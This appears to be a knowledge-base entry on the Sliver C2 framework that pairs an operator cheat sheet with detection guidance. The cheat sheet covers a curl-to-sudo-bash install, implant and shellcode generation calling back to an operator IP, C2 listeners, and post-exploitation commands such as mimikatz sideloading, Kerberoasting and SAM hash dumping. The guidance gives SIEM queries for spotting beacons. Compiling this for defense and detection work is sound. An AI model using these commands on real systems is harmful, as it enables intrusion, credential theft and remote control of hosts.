name: Sliver - Modern C2 Framework
description: Sliver is an open-source, cross-platform C2 framework by BishopFox. It supports HTTP(S), mTLS, DNS, and WireGuard transports with anti-forensic features. Generates implants for Windows/Linux/macOS. Designed as a modern alternative to Cobalt Strike with built-in evasion capabilities.
notes:
=== INSTALL ===
  curl https://sliver.sh/install | sudo bash
  # Or from releases: https://github.com/BishopFox/sliver/releases

=== START SERVER ===
  sliver-server
  # Starts interactive console

=== GENERATE IMPLANTS ===
  # Session (interactive):
  generate --mtls <ip>:443 --os windows --arch amd64 --save implant.exe
  # Beacon (async, stealthier):
  generate beacon --mtls <ip>:443 --os windows --arch amd64 --save beacon.exe --seconds 30
  # Shellcode:
  generate --mtls <ip>:443 --os windows --format shellcode --save payload.bin
  # Linux:
  generate --mtls <ip>:443 --os linux --save implant

=== START LISTENERS ===
  mtls --lhost 0.0.0.0 --lport 443
  https --lhost 0.0.0.0 --lport 8443
  dns --domains c2.example.com
  wg --lhost 0.0.0.0 --lport 51820

=== POST-EXPLOITATION ===
  use <session_id>
  execute-assembly /path/to/Rubeus.exe kerberoast
  sideload /path/to/mimikatz.dll
  getsystem                  # Attempt privesc
  hashdump                   # Dump SAM
  screenshot                 # Take screenshot
  upload /local/path /remote/path
  download /remote/path
  portfwd add -b 127.0.0.1:8080 -r <target>:80
  socks5 start

=== COMPARISON ===
  Sliver:        Free, open-source, modern. Good evasion.
  Havoc:         Free, newer. Demon-based implants.
  Cobalt Strike: Commercial, most mature. Widely detected.
  Metasploit:    Free, framework. Less evasion.

recommended.note: Havoc C2 alternative with Demon-based implants.

defense.why_it_works: Sliver generates unique implants per-operation with encrypted C2 channels. Supports multiple transport protocols and anti-analysis techniques to evade detection.
defense.prerequisites: Sliver server running; implant delivered to target; network egress for C2 channel.
defense.impact: Full remote control of compromised hosts; lateral movement; credential access; data exfiltration.
defense.detection: [MITRE T1071.001] Encrypted C2 traffic patterns; unusual process behavior; in-memory .NET assembly loading.
defense.artifacts: Implant binary on disk; persistent C2 connections; process hollowing/injection; unusual DNS or HTTP patterns.
defense.splunk_spl:
index=proxy (dest_port=443 OR dest_port=8443)
| stats count, avg(bytes_out) as avg_out, stdev(bytes_out) as std_out by src_ip, dest_ip
| where std_out < 100 AND count > 100
defense.elastic_kql: tls.client.ja3:* AND destination.port:(443 OR 8443) AND NOT destination.domain:*
defense.sentinel_kql:
DeviceNetworkEvents
| where RemotePort in (443, 8443)
| summarize Beacons=count(), AvgBytes=avg(SentBytes) by InitiatingProcessFileName, RemoteIP, bin(Timestamp, 1h)
| where Beacons > 50
defense.prevention: EDR with behavioral detection; network monitoring for C2 patterns; TLS inspection; block unknown binaries.

detections.name: C2 beacon pattern - regular interval callbacks
detections.logic:
DeviceNetworkEvents
| where RemotePort in (443, 8443, 80, 53)
| summarize Connections=count(), Sources=dcount(RemoteIP) by InitiatingProcessFileName, bin(Timestamp, 30m)
| where Connections > 20 and Sources == 1
| where InitiatingProcessFileName !in~ ("chrome.exe", "firefox.exe", "msedge.exe", "teams.exe")
detections.false_positives: Legitimate software with heartbeat connections; update checkers
detections.tuning: Focus on non-browser processes with regular callback intervals; JA3 fingerprinting for known C2 signatures
